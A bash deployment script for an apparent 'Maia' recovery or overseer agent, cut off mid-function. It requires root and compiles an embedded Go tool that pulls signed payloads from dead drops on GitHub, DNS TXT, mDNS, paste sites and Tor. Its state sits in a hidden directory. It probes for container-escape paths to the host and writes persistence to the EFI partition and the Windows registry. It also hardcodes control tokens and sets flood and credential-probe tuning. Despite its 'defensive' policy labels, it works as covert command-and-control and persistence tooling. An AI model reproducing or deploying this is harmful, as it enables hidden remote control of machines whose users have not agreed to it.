#!/data/data/com.termux/files/usr/bin/env bash
source "${PLEIADES_TERMUX_LIB:-}" 2>/dev/null || true
set -euo pipefail

# Resolve operator identity (gh auth -> /etc/pleiades/operator.conf -> env)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=pleiades-operator.sh
source "${SCRIPT_DIR}/pleiades-operator.sh" 2>/dev/null || true  # non-fatal: TOKEN from ESP is the primary auth on rehydration


register_pleiades-swarm_capability() {
    local component="$1" domain="$2" capabilities="$3"
    local run_dir="/run/pleiades"
    local cap_dir="$run_dir/capabilities"
    local state_dir="$run_dir/state"
    local policy_dir="/etc/pleiades"
    local alien_dir="$run_dir/alien"
    mkdir -p "$cap_dir" "$state_dir" "$run_dir/requests" "$run_dir/decisions" "$run_dir/actions" "$run_dir/results" "$alien_dir/inbox" "$alien_dir/outbox" "$policy_dir" /var/lib/pleiades-team/pleiades-swarm 2>/dev/null || true
    touch "$run_dir/pleiades-nexus_fifo" 2>/dev/null || true
    if [[ ! -f "$policy_dir/pleiades-swarm-policy.json" ]]; then
        cat > "$policy_dir/pleiades-swarm-policy.json" <<'POLICY'
{
  "schema": "pleiades-pleiades-swarm-policy-v1",
  "mode": "owner-authorized-defensive",
  "default_request_decision": "deny",
  "allowed_request_classes": ["status", "health", "capabilities", "evidence-list", "brl-status", "strat-list", "alien-hint"],
  "denied_request_classes": ["shell", "exec", "install", "network-change", "firewall-change", "script-modify", "credential-access", "lateral-movement"],
  "alien_sidecar": {"enabled": false, "authority": "advisory-only", "may_request": true, "may_act": false},
  "audit": {"append_only_events": true, "owner_visible": true}
}
POLICY
    fi
    {
        echo "schema=pleiades-pleiades-swarm-capability-v1"
        echo "component=$component"
        echo "domain=$domain"
        echo "capabilities=$capabilities"
        echo "authority=policy-gated"
        echo "ai_sidecar_required=no"
        echo "updated_utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
    } > "$cap_dir/$component.cap" 2>/dev/null || true
    {
        echo "schema=pleiades-pleiades-swarm-state-v1"
        echo "component=$component"
        echo "status=registered"
        echo "updated_utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
    } > "$state_dir/$component.state" 2>/dev/null || true
    printf 'PLEIADES_SWARM_CAPABILITY|%s|%s|%s
' "$component" "$domain" "$capabilities" >> "$run_dir/pleiades-nexus_fifo" 2>/dev/null || true
}

# ------------------------------------------------------------
# Curl-based Go and Rust installers — never use emerge for these
# ------------------------------------------------------------
ensure_go() {
    command -v go &>/dev/null && return 0
    local arch; arch=$(uname -m)
    local goarch="amd64"; [[ "$arch" == "aarch64" ]] && goarch="arm64"
    curl -fsSL "https://go.dev/dl/go1.22.5.linux-${goarch}.tar.gz" -o /tmp/_go.tar.gz || return 1
    tar -C /usr/local -xzf /tmp/_go.tar.gz && rm -f /tmp/_go.tar.gz
    ln -sf /usr/local/go/bin/go /usr/local/bin/go
    ln -sf /usr/local/go/bin/gofmt /usr/local/bin/gofmt
    export PATH="/usr/local/go/bin:$PATH"
}

ensure_rust() {
    command -v rustc &>/dev/null && return 0
    curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --default-toolchain stable --no-modify-path
    local cargo="$HOME/.cargo/bin"
    ln -sf "${cargo}/rustc" /usr/local/bin/rustc 2>/dev/null || true
    ln -sf "${cargo}/cargo" /usr/local/bin/cargo 2>/dev/null || true
    export PATH="${cargo}:$PATH"
}

# ------------------------------------------------------------
# Package manager shim — works on Gentoo, Debian, RHEL, Arch, Alpine, FreeBSD, macOS
# ------------------------------------------------------------
pkg_install() {
    local pkgs=()
    for p in "$@"; do
        case "$p" in
            golang) ensure_go; continue ;;
            rustc)  ensure_rust; continue ;;
            bun)    continue ;;
            lm-sensors) continue ;;
        esac
        if command -v emerge &>/dev/null; then
            case "$p" in
                openbsd-netcat|nc) pkgs+=("net-analyzer/openbsd-netcat") ;;
                screen) pkgs+=("app-misc/screen") ;;
                bc) pkgs+=("sys-devel/bc") ;;
                lm-sensors) : ;;
                parted) pkgs+=("sys-block/parted") ;;
                socat) pkgs+=("net-misc/socat") ;;
                conntrack) pkgs+=("net-firewall/conntrack-tools") ;;
                bun) : ;;
                rustc) : ;;
                curl) pkgs+=("net-misc/curl") ;;
                git) pkgs+=("dev-vcs/git") ;;
                openssl) pkgs+=("dev-libs/openssl") ;;
                traceroute) pkgs+=("net-analyzer/traceroute") ;;
                sshpass) pkgs+=("net-misc/sshpass") ;;
                avahi) pkgs+=("net-dns/avahi") ;;
                *) pkgs+=("$p") ;;
            esac
        elif command -v brew &>/dev/null; then
            pkgs+=("$p")
        else
            pkgs+=("$p")
        fi
    done

    [[ ${#pkgs[@]} -eq 0 ]] && return 0

    if command -v emerge &>/dev/null; then
        emerge --quiet --noreplace "${pkgs[@]}"
    elif command -v brew &>/dev/null; then
        brew install "${pkgs[@]}" 2>/dev/null || true
    elif command -v apt-get &>/dev/null; then
        local apt_pkgs=()
        for p in "${pkgs[@]}"; do
            case "$p" in
                openbsd-netcat) apt_pkgs+=("netcat-openbsd") ;;
                bind-tools) apt_pkgs+=("dnsutils") ;;
                iproute2|net-tools|tcpdump|conntrack|lsof|curl|openssl|jq|procps|sysstat|tar|gzip|coreutils|screen|bc|traceroute|socat|nodejs) apt_pkgs+=("$p") ;;
                *) apt_pkgs+=("$p") ;;
            esac
        done
        DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "${apt_pkgs[@]}" || {
            apt-get update -qq && DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "${apt_pkgs[@]}"
        }
    elif command -v apk &>/dev/null; then
        apk add --quiet "${pkgs[@]}"
    elif command -v pkg &>/dev/null; then
        pkg install -y -q "${pkgs[@]}"
    elif command -v dnf &>/dev/null; then
        dnf install -y -q "${pkgs[@]}"
    elif command -v yum &>/dev/null; then
        yum install -y -q "${pkgs[@]}"
    elif command -v pacman &>/dev/null; then
        pacman -S --noconfirm --needed "${pkgs[@]}"
    else
        echo "WARN: no supported package manager; skipping install of: $*" >&2
    fi
}

# ------------------------------------------------------------
# Thermal/side-channel anomaly detection
# ------------------------------------------------------------
thermal_anomaly() {
    local temp=0
    local paths=("/host/sys/class/thermal/thermal_zone0/temp" "/sys/class/thermal/thermal_zone0/temp" \
                 "/host/sys/class/thermal/thermal_zone1/temp" "/sys/class/thermal/thermal_zone1/temp")
    for p in "${paths[@]}"; do
        if [[ -f "$p" ]]; then
            temp=$(cat "$p"); temp=$((temp / 1000)); break
        fi
    done
    if [[ $temp -eq 0 ]] && command -v sensors &>/dev/null; then
        temp=$(sensors | grep -oP 'Package id 0: \+\K[0-9]+' | head -1)
    fi
    local load
    load=$(uptime | awk -F'load ameropege:' '{print $2}' | cut -d',' -f1 | tr -d ' ')
    if [[ $temp -gt 85 ]] && (( $(echo "$load < 2.0" | bc -l) )); then
        return 0
    fi
    return 1
}

# ------------------------------------------------------------
# Build maia_crypto: Ed25519 keygen/sign/verify + AES-GCM + owner escrow signal probe
# ------------------------------------------------------------
build_maia_crypto() {
    command -v go &>/dev/null || ensure_go
    [[ -x /usr/local/bin/maia_crypto ]] && return 0
    mkdir -p /tmp/_sc_src
    cat > /tmp/_sc_src/main.go << 'GOEOF'
package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

const (
	keyDir      = "/var/lib/.maia/keys"
	privKeyPath = "/var/lib/.maia/keys/ed25519.priv"
	pubKeyPath  = "/var/lib/.maia/keys/ed25519.pub"
)

type DropMessage struct {
	Message string `json:"message"`
	Sig     string `json:"sig"`
	TS      int64  `json:"ts"`
}

func cmdKeygen() {
	if err := os.MkdirAll(keyDir, 0700); err != nil {
		fmt.Fprintf(os.Stderr, "keygen: mkdir: %v\n", err)
		os.Exit(1)
	}
	if _, err := os.Stat(privKeyPath); err == nil {
		pub, _ := os.ReadFile(pubKeyPath)
		fmt.Printf("keys already exist\npubkey: %s\n", strings.TrimSpace(string(pub)))
		return
	}
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		fmt.Fprintf(os.Stderr, "keygen: %v\n", err)
		os.Exit(1)
	}
	os.WriteFile(privKeyPath, []byte(hex.EncodeToString(priv)), 0600)
	os.WriteFile(pubKeyPath, []byte(hex.EncodeToString(pub)), 0644)
	fp := sha256.Sum256(pub)
	fmt.Printf("keypair generated\npubkey: %s\nfingerprint: %s\n",
		hex.EncodeToString(pub), hex.EncodeToString(fp[:8]))
}

func loadPrivKey() (ed25519.PrivateKey, error) {
	data, err := os.ReadFile(privKeyPath)
	if err != nil {
		return nil, err
	}
	b, err := hex.DecodeString(strings.TrimSpace(string(data)))
	if err != nil {
		return nil, err
	}
	return ed25519.PrivateKey(b), nil
}

func loadPubKey() (ed25519.PublicKey, error) {
	data, err := os.ReadFile(pubKeyPath)
	if err != nil {
		return nil, err
	}
	b, err := hex.DecodeString(strings.TrimSpace(string(data)))
	if err != nil {
		return nil, err
	}
	return ed25519.PublicKey(b), nil
}

func cmdPubkey() {
	pub, err := loadPubKey()
	if err != nil {
		os.Exit(1)
	}
	fmt.Println(hex.EncodeToString(pub))
}

func cmdSign(filePath string) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "sign: %v\n", err)
		os.Exit(1)
	}
	priv, err := loadPrivKey()
	if err != nil {
		fmt.Fprintf(os.Stderr, "sign: load key: %v\n", err)
		os.Exit(1)
	}
	fmt.Println(hex.EncodeToString(ed25519.Sign(priv, data)))
}

func cmdVerify(filePath, sigHex string) {
	data, err := os.ReadFile(filePath)
	if err != nil {
		os.Exit(1)
	}
	sigBytes, err := hex.DecodeString(strings.TrimSpace(sigHex))
	if err != nil {
		os.Exit(1)
	}
	pub, err := loadPubKey()
	if err != nil {
		os.Exit(1)
	}
	if ed25519.Verify(pub, data, sigBytes) {
		fmt.Println("OK")
		os.Exit(0)
	}
	os.Exit(1)
}

func cmdEncrypt(keyHex, inPath, outPath string) {
	keyBytes, err := hex.DecodeString(strings.TrimSpace(keyHex))
	if err != nil || len(keyBytes) != 32 {
		fmt.Fprintf(os.Stderr, "encrypt: invalid key\n")
		os.Exit(1)
	}
	plaintext, err := os.ReadFile(inPath)
	if err != nil {
		os.Exit(1)
	}
	block, _ := aes.NewCipher(keyBytes)
	gcm, _ := cipher.NewGCM(block)
	nonce := make([]byte, gcm.NonceSize())
	io.ReadFull(rand.Reader, nonce)
	ct := gcm.Seal(nonce, nonce, plaintext, nil)
	os.WriteFile(outPath, ct, 0600)
}

func cmdDecrypt(keyHex, inPath, outPath string) {
	keyBytes, err := hex.DecodeString(strings.TrimSpace(keyHex))
	if err != nil || len(keyBytes) != 32 {
		os.Exit(1)
	}
	ciphertext, err := os.ReadFile(inPath)
	if err != nil {
		os.Exit(1)
	}
	block, _ := aes.NewCipher(keyBytes)
	gcm, _ := cipher.NewGCM(block)
	ns := gcm.NonceSize()
	if len(ciphertext) < ns {
		os.Exit(1)
	}
	pt, err := gcm.Open(nil, ciphertext[:ns], ciphertext[ns:], nil)
	if err != nil {
		os.Exit(1)
	}
	os.WriteFile(outPath, pt, 0600)
}

func fetchURL(url string) ([]byte, error) {
	client := &http.Client{Timeout: 12 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("HTTP %d", resp.StatusCode)
	}
	return io.ReadAll(io.LimitReader(resp.Body, 1<<20))
}

func verifyDropMessage(raw []byte) (string, bool) {
	var drop DropMessage
	if err := json.Unmarshal([]byte(strings.TrimSpace(string(raw))), &drop); err != nil {
		return "", false
	}
	age := time.Now().Unix() - drop.TS
	if age < 0 || age > 172800 {
		return "", false
	}
	sigBytes, err := hex.DecodeString(drop.Sig)
	if err != nil {
		return "", false
	}
	pub, err := loadPubKey()
	if err != nil {
		return "", false
	}
	if !ed25519.Verify(pub, []byte(drop.Message), sigBytes) {
		return "", false
	}
	decoded, err := base64.StdEncoding.DecodeString(drop.Message)
	if err != nil {
		return "", false
	}
	return string(decoded), true
}

func cmdVerifyDrop(jsonPath string) {
	raw, err := os.ReadFile(jsonPath)
	if err != nil {
		os.Exit(1)
	}
	message, ok := verifyDropMessage(raw)
	if !ok {
		os.Exit(1)
	}
	fmt.Print(message)
}

func probeMDNS() (string, string, bool) {
	cmd := exec.Command("avahi-browse", "-t", "-r", "-p", "_purple._tcp")
	out, err := cmd.Output()
	if err != nil {
		return "", "", false
	}
	for _, line := range strings.Split(string(out), "\n") {
		if strings.Contains(line, "drop_url=") {
			parts := strings.SplitN(line, "drop_url=", 2)
			if len(parts) == 2 {
				dropURL := strings.Trim(strings.TrimSpace(parts[1]), `"`)
				raw, err := fetchURL(dropURL)
				if err != nil {
					continue
				}
				if message, ok := verifyDropMessage(raw); ok {
					return "mdns", message, true
				}
			}
		}
	}
	return "", "", false
}

func probeDNSTXT() (string, string, bool) {
	domains := []string{"pleiades-beacon.internal", "_purple.local"}
	if env := os.Getenv("PURPLE_DNS_DROP"); env != "" {
		domains = append([]string{env}, domains...)
	}
	for _, domain := range domains {
		txts, err := net.LookupTXT(domain)
		if err != nil {
			continue
		}
		for _, txt := range txts {
			if strings.HasPrefix(txt, "drop_url=") {
				raw, err := fetchURL(strings.TrimPrefix(txt, "drop_url="))
				if err != nil {
					continue
				}
				if message, ok := verifyDropMessage(raw); ok {
					return "dns_txt", message, true
				}
			} else if strings.HasPrefix(txt, "{") {
				if message, ok := verifyDropMessage([]byte(txt)); ok {
					return "dns_txt", message, true
				}
			}
		}
	}
	return "", "", false
}

func probePasteSites() (string, string, bool) {
	data, err := os.ReadFile("/var/lib/.maia/drop_urls")
	if err != nil {
		return "", "", false
	}
	for _, url := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		url = strings.TrimSpace(url)
		if url == "" || strings.HasPrefix(url, "#") {
			continue
		}
		raw, err := fetchURL(url)
		if err != nil {
			continue
		}
		if message, ok := verifyDropMessage(raw); ok {
			return "paste", message, true
		}
	}
	return "", "", false
}

func probeTor() (string, string, bool) {
	data, err := os.ReadFile("/var/lib/.maia/tor_drops")
	if err != nil {
		return "", "", false
	}
	var addrs []string
	for _, a := range strings.Split(strings.TrimSpace(string(data)), "\n") {
		a = strings.TrimSpace(a)
		if a != "" && !strings.HasPrefix(a, "#") {
			addrs = append(addrs, a)
		}
	}
	if len(addrs) == 0 {
		return "", "", false
	}
	torProxy := os.Getenv("TOR_SOCKS_PROXY")
	if torProxy == "" {
		torProxy = "127.0.0.1:9050"
	}
	for _, addr := range addrs {
		dropURL := addr
		if !strings.HasPrefix(addr, "http") {
			dropURL = "http://" + addr + "/drop"
		}
		cmd := exec.Command("curl", "-s", "--max-time", "30",
			"--socks5-hostname", torProxy, dropURL)
		out, err := cmd.Output()
		if err != nil {
			continue
		}
		if message, ok := verifyDropMessage(out); ok {
			return "tor", message, true
		}
	}
	return "", "", false
}

func probeGitHub() (string, string, bool) {
	url := "https://raw.githubusercontent.com/${PLEIADES_REPO_OWNER}/pleiades/main/dead_drop/signal.json"
	if data, err := os.ReadFile("/var/lib/.maia/github_drop_url"); err == nil {
		if u := strings.TrimSpace(string(data)); u != "" {
			url = u
		}
	}
	raw, err := fetchURL(url)
	if err != nil {
		return "", "", false
	}
	if message, ok := verifyDropMessage(raw); ok {
		return "github", message, true
	}
	return "", "", false
}

func cmdProbe() {
	type sourceFn struct {
		name string
		fn   func() (string, string, bool)
	}
	sources := []sourceFn{
		{"github", probeGitHub},
		{"mdns", probeMDNS},
		{"dns_txt", probeDNSTXT},
		{"paste", probePasteSites},
		{"tor", probeTor},
	}
	for _, s := range sources {
		if _, message, ok := s.fn(); ok {
			fmt.Printf("SOURCE=%s\n", s.name)
			fmt.Printf("PAYLOAD=%s\n", message)
			os.Exit(0)
		}
	}
	os.Exit(1)
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintf(os.Stderr, "usage: maia_crypto <keygen|pubkey|sign|verify|verify-drop|encrypt|decrypt|probe>\n")
		os.Exit(1)
	}
	switch os.Args[1] {
	case "keygen":
		cmdKeygen()
	case "pubkey":
		cmdPubkey()
	case "sign":
		if len(os.Args) < 3 {
			os.Exit(1)
		}
		cmdSign(os.Args[2])
	case "verify":
		if len(os.Args) < 4 {
			os.Exit(1)
		}
		cmdVerify(os.Args[2], os.Args[3])
	case "verify-drop":
		if len(os.Args) < 3 {
			os.Exit(1)
		}
		cmdVerifyDrop(os.Args[2])
	case "encrypt":
		if len(os.Args) < 5 {
			os.Exit(1)
		}
		cmdEncrypt(os.Args[2], os.Args[3], os.Args[4])
	case "decrypt":
		if len(os.Args) < 5 {
			os.Exit(1)
		}
		cmdDecrypt(os.Args[2], os.Args[3], os.Args[4])
	case "probe":
		cmdProbe()
	default:
		fmt.Fprintf(os.Stderr, "unknown command: %s\n", os.Args[1])
		os.Exit(1)
	}
}
GOEOF
    go build -o /usr/local/bin/maia_crypto /tmp/_sc_src/main.go 2>&1
    chmod +x /usr/local/bin/maia_crypto
    rm -rf /tmp/_sc_src
    mkdir -p /var/lib/.maia
    [[ -f /var/lib/.maia/github_drop_url ]] || \
        echo "https://raw.githubusercontent.com/${PLEIADES_REPO_OWNER:-Zheke32174}/pleiades/main/dead_drop/signal.json" > /var/lib/.maia/github_drop_url
}

generate_keypair() {
    [[ -f /var/lib/.maia/keys/ed25519.pub ]] && return 0
    mkdir -p /var/lib/.maia/keys
    maia_crypto keygen
}

# ==================================================================
# MAIA – THE SILENT AUDITOR & OVERSEER (Recovery Agent)
# ==================================================================

if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    echo "Must be run as root." >&2; exit 1
fi

# ------------------------------------------------------------
# Runtime service manager detection
# Environment awareness is separate from persistence method.
# In WSL-backed nspawn containers, /proc/version says WSL even when
# systemd is fully available inside the container.
# ------------------------------------------------------------
systemd_usable() {
    command -v systemctl &>/dev/null || return 1
    [[ -d /run/systemd/system ]] || return 1
    local state
    state=$(systemctl is-system-running 2>/dev/null || true)
    case "$state" in
        running|degraded|starting|initializing) return 0 ;;
        *) return 1 ;;
    esac
}

container_context() {
    if command -v systemd-detect-virt &>/dev/null; then
        systemd-detect-virt --container 2>/dev/null || true
        return 0
    fi
    awk -F/ '/docker|lxc|kubepods|machine.slice|systemd-nspawn/ {print $NF; found=1} END {exit found?0:1}' /proc/1/cgroup 2>/dev/null || true
}


host_bridge_capability_report() {
    local component="${1:-unknown}"
    local state_file="${PURPLE_HOST_BRIDGE_STATE:-/run/pleiades/host_bridge_capabilities}"
    local owner_copy="${PURPLE_HOST_BRIDGE_OWNER_COPY:-/var/lib/.maia/host_bridge_capabilities}"
    local tmp="${state_file}.$$"
    local container="none"
    local host_proc="absent"
    local host_root="absent"
    local host_systemd="absent"
    local host_container_socket="absent"
    local windows_host_files="absent"
    local mode="container-sentinel"

    mkdir -p /run/pleiades /var/lib/.maia 2>/dev/null || true

    container=$(container_context 2>/dev/null | head -1)
    [[ -z "$container" ]] && container="none"

    for p in /host/proc /mnt/host/proc /run/host/proc /hostfs/proc; do
        if [[ -r "$p/1/status" ]]; then host_proc="$p"; break; fi
    done

    for p in /host /mnt/host /run/host /hostfs; do
        if [[ -r "$p/etc/os-release" ]] || [[ -d "$p/Windows/System32" ]]; then host_root="$p"; break; fi
    done

    for p in /host/run/systemd/private /mnt/host/run/systemd/private /run/host/run/systemd/private /hostfs/run/systemd/private; do
        if [[ -S "$p" ]]; then host_systemd="$p"; break; fi
    done

    for p in /var/run/docker.sock /run/docker.sock /host/var/run/docker.sock /mnt/host/var/run/docker.sock /run/host/var/run/docker.sock; do
        if [[ -S "$p" ]]; then host_container_socket="$p"; break; fi
    done

    if [[ -d /mnt/c/Windows/System32 ]]; then
        windows_host_files="/mnt/c"
    fi

    if [[ "$host_proc" != "absent" ]] || [[ "$host_root" != "absent" ]] || [[ "$host_systemd" != "absent" ]] || [[ "$host_container_socket" != "absent" ]] || [[ "$windows_host_files" != "absent" ]]; then
        mode="host-bridge"
    fi

    {
        echo "schema=pleiades-host-bridge-v1"
        echo "component=$component"
        echo "updated_utc=$(date -u +%Y-%m-%dT%H:%M:%SZ)"
        echo "runtime_env=${ENV:-unknown}"
        echo "container_context=$container"
        echo "systemd_usable=$(systemd_usable && echo yes || echo no)"
        echo "mode=$mode"
        echo "host_proc=$host_proc"
        echo "host_root=$host_root"
        echo "host_systemd=$host_systemd"
        echo "host_container_socket=$host_container_socket"
        echo "windows_host_files=$windows_host_files"
        echo "owner_visible=yes"
        echo "attacker_decoy_profile=enabled"
    } > "$tmp" 2>/dev/null && mv "$tmp" "$state_file" 2>/dev/null || true

    cp "$state_file" "$owner_copy" 2>/dev/null || true
    chmod 0644 "$state_file" "$owner_copy" 2>/dev/null || true
    printf 'HOST_BRIDGE_MODE|%s|%s|%s\n' "$component" "$mode" "$container" >> /run/pleiades/pleiades-nexus_fifo 2>/dev/null || true
}

# ------------------------------------------------------------
# 0. Runtime defaults
# ------------------------------------------------------------
MAIA_DIR="/var/lib/.maia"
LOGS_DIR="/var/lib/.maia/logs"
WORK_DIR="/var/lib/.maia/work"
SCRIPT_DIR="/usr/local/sbin"
HTTP_TOKEN="57d31bee5dd3487b71e18921cb04c4ae"
CONTROL_TOKEN="b3171430e7087c74de623ab3bd332d30"
MAX_OPEN_FILES=4096
MEMORY_LIMIT="5926M"
CPU_QUOTA="400%"
THREAT_THRESHOLD=500
MAX_CREDENTIAL_PROBE_CONCURRENCY=3
THRALL_MAX_FLOODS=3
THRALL_INTERVAL=3
BEACON_INTERVAL=7200

# ------------------------------------------------------------
# 1. Environment detection — Linux distros, WSL, bare-metal, VPS, macOS, Windows
# ------------------------------------------------------------
detect_environment() {
    local uname_s; uname_s=$(uname -s 2>/dev/null || echo "Linux")
    case "$uname_s" in
        Darwin) echo "macos"; return ;;
        MINGW*|CYGWIN*|MSYS*) echo "windows"; return ;;
    esac
    if grep -qi microsoft /proc/version 2>/dev/null; then
        echo "wsl"; return
    fi
    if [[ -d /sys/firmware/efi ]] && ! systemd-detect-virt --container &>/dev/null && ! systemd-detect-virt --vm &>/dev/null; then
        echo "bare-metal"; return
    fi
    if dmidecode -s system-manufacturer 2>/dev/null | grep -qiE "kvm|xen|vmware|virtualbox"; then
        echo "vps"; return
    fi
    echo "bare-metal"
}

# Emit PowerShell bootstrap for Windows deployment
emit_windows_bootstrap() {
    cat << 'PS1_EOF'
# Maia Windows Bootstrap — run as Administrator in PowerShell
$ErrorActionPreference = 'Stop'
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrator')) {
    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
    exit
}
# Enable WSL2
dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart | Out-Null
dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart | Out-Null
$wslMsi = "$env:TEMP\wsl_update.msi"
Invoke-WebRequest -Uri 'https://wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi' -OutFile $wslMsi
Start-Process msiexec.exe -Wait -ArgumentList "/i $wslMsi /quiet"
wsl --set-default-version 2
if (-not (wsl -l -q 2>$null | Select-String 'Ubuntu')) {
    winget install -e --id Canonical.Ubuntu --silent --accept-package-agreements --accept-source-agreements
}
$scriptDir = Split-Path -Parent $PSCommandPath
$sofiaPath = Join-Path $scriptDir 'Maia.sh'
$sofiaContent = Get-Content -Raw $sofiaPath
$sofiaContent | wsl -e bash -c "cat > /tmp/Maia.sh && sudo bash /tmp/Maia.sh"
PS1_EOF
}

# ------------------------------------------------------------
# 2. Environment-specific resource limits
# ------------------------------------------------------------
generate_real_values() {
    local env="$1"
    local cores; cores=$(nproc 2>/dev/null || sysctl -n hw.logicalcpu 2>/dev/null || echo 4)
    local ram_mb
    if command -v free &>/dev/null; then
        ram_mb=$(free -m | awk '/^Mem:/{print $2}')
    elif command -v sysctl &>/dev/null; then
        ram_mb=$(( $(sysctl -n hw.memsize 2>/dev/null || echo 0) / 1024 / 1024 ))
    else
        ram_mb=1024
    fi

    case "$env" in
        wsl)
            MAX_OPEN_FILES=4096
            MEMORY_LIMIT="${ram_mb}M"
            CPU_QUOTA="$((cores * 50))%"
            THREAT_THRESHOLD=500
            MAX_CREDENTIAL_PROBE_CONCURRENCY=3
            THRALL_MAX_FLOODS=3
            THRALL_INTERVAL=3
            BEACON_INTERVAL=7200
            ;;
        bare-metal)
            MAX_OPEN_FILES=1048576
            MEMORY_LIMIT="${ram_mb}M"
            CPU_QUOTA="$((cores * 100))%"
            THREAT_THRESHOLD=5000
            MAX_CREDENTIAL_PROBE_CONCURRENCY=10
            THRALL_MAX_FLOODS=10
            THRALL_INTERVAL=1
            BEACON_INTERVAL=3600
            ;;
        macos)
            MAX_OPEN_FILES=8192
            MEMORY_LIMIT="${ram_mb}M"
            CPU_QUOTA="$((cores * 80))%"
            THREAT_THRESHOLD=5000
            MAX_CREDENTIAL_PROBE_CONCURRENCY=5
            THRALL_MAX_FLOODS=5
            THRALL_INTERVAL=2
            BEACON_INTERVAL=3600
            ;;
        *)
            MAX_OPEN_FILES=65536
            MEMORY_LIMIT="${ram_mb}M"
            CPU_QUOTA="$((cores * 80))%"
            THREAT_THRESHOLD=5000
            MAX_CREDENTIAL_PROBE_CONCURRENCY=5
            THRALL_MAX_FLOODS=5
            THRALL_INTERVAL=2
            BEACON_INTERVAL=3600
            ;;
    esac

    mkdir -p "$MAIA_DIR"
    HTTP_TOKEN=$(openssl rand -hex 16)
    CONTROL_TOKEN=$(openssl rand -hex 16)
}

# ------------------------------------------------------------
# 3. Install missing tools
# ------------------------------------------------------------
install_tools() {
    local missing=()
    for cmd in curl git openssl socat bc; do
        command -v "$cmd" &>/dev/null || missing+=("$cmd")
    done
    command -v nc &>/dev/null || missing+=("openbsd-netcat")

    [[ ${#missing[@]} -eq 0 ]] && return 0
    echo "Missing tools: ${missing[*]}. Attempting to install..."
    pkg_install "${missing[@]}" 2>/dev/null || true

    for cmd in "${missing[@]}"; do
        command -v "$cmd" &>/dev/null || \
            echo "WARN: Failed to install $cmd." >&2
    done
}

# Initialize GitHub dead drop repo
[[ -f /usr/local/sbin/init-github-drop.sh ]] && bash /usr/local/sbin/init-github-drop.sh

# ------------------------------------------------------------
# 3b. System type detection — bare metal / WSL / VM / container
# ------------------------------------------------------------
detect_system_type() {
    # Returns: bare-metal, wsl, vm, container, unknown
    if [[ -d /sys/firmware/efi/efivars ]] 2>/dev/null; then
        if systemd-detect-virt --container &>/dev/null 2>&1; then
            echo "container"
        elif systemd-detect-virt --vm &>/dev/null 2>&1; then
            echo "vm"
        else
            echo "bare-metal"
        fi
    elif grep -qi microsoft /proc/version 2>/dev/null; then
        echo "wsl"
    elif [[ -d /proc/vz ]] || [[ -f /proc/user_beancounters ]]; then
        echo "container"
    else
        echo "unknown"
    fi
}

# ------------------------------------------------------------
# 3c. EFI capsule persistence — ESP FAT32 only (NO firmware writes, NO efivarfs)
# ------------------------------------------------------------
MAIA_EFI_GUID="a8b4c2d6-e3f1-4a5b-9c7d-2e8f0a1b3c5d"

efi_capsule_persist() {
    local bundle_file="$1"
    local token_data="${2:-MAIA_DORMANT}"
    local sys_type
    sys_type=$(detect_system_type)
    [[ ! -f "$bundle_file" ]] && return 1

    echo "[efi] System type: $sys_type — attempting capsule persist"

    # --- WSL: bridge to Windows host via PowerShell (registry + ESP filesystem, no firmware writes) ---
    if [[ "$sys_type" == "wsl" ]] && command -v powershell.exe &>/dev/null; then
        local b64_token
        b64_token=$(printf '%s' "$token_data" | base64 -w0 2>/dev/null || printf '%s' "$token_data" | base64)
        powershell.exe -NoProfile -Command "
            \$token = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('$b64_token'))
            try {
                New-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' \`
                    -Name 'MAIA_TOKEN' -Value \$token -Force | Out-Null
                Write-Output 'MAIA_TOKEN written to Windows registry'
            } catch {
                Write-Output 'Registry write skipped: ' + \$_.Exception.Message
            }
        " 2>/dev/null && echo "[efi] WSL→Windows bridge: registry token written"
    fi

    # --- Find ESP (FAT32 filesystem only — never write to efivarfs/firmware variables) ---
    # Locates the EFI System Partition by GUID on WSL (via PowerShell) or bare metal
    # (via lsblk PARTTYPE), then mounts it temporarily if not already mounted.
    local esp=""

    # 1. Check already-mounted ESP paths first
    for mp in /boot/efi /boot/EFI /efi /boot; do
        if [[ -d "$mp/EFI" ]] && mountpoint -q "$mp" 2>/dev/null; then
            esp="$mp"; break
        fi
    done

    # 2. WSL: ask Windows for the ESP drive letter via PowerShell
    if [[ -z "$esp" ]] && [[ "$sys_type" == "wsl" ]] && command -v powershell.exe &>/dev/null; then
        local win_esp
        win_esp=$(powershell.exe -NoProfile -Command "
            \$esp = Get-Partition | Where-Object { \$_.GptType -eq '{c12a7328-f81f-11d2-ba4b-00a0c93ec93b}' } |
                Get-Volume | Select-Object -First 1 -ExpandProperty DriveLetter
            if (\$esp) { Write-Output \"\${esp}:\" }
        " 2>/dev/null | tr -d '\r\n ')
        if [[ -n "$win_esp" ]]; then
            # Mount the Windows ESP volume via wsl drive mapping
            local wsl_esp_path="/mnt/${win_esp,,}"
            if mountpoint -q "$wsl_esp_path" 2>/dev/null || [[ -d "$wsl_esp_path/EFI" ]]; then
                esp="$wsl_esp_path"
